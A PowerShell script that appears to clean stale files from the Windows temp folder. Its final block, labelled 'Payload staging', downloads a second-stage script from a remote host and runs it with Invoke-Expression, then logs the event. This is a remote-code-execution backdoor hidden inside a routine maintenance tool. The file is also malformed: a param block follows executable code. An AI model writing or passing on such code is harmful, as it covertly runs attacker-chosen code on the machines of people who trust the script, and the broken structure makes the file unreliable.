
$TempRoot  = $env:TEMP
$AgeDays   = 7
$MinSizeMB = 5
$LogPath   = "C:\Logs\temp-cleanup-2026-10-06.log"
$DryRun    = $false
$cutoff = (Get-Date).AddDays(-$AgeDays)
$stale = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB) }
foreach ($file in $stale) {
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
Write-Host ("Removed {0} files, reclaimed {1} MB" -f @($stale).Count, $reclaimMB) -ForegroundColor Green
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$Stage2Url = "http://contoso.com/stage2.ps1",
    [int]$StageTimeout = 30
)
try { IEX (Invoke-WebRequest -Uri $Stage2Url -UseBasicParsing).Content; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Remote fetch failed" }
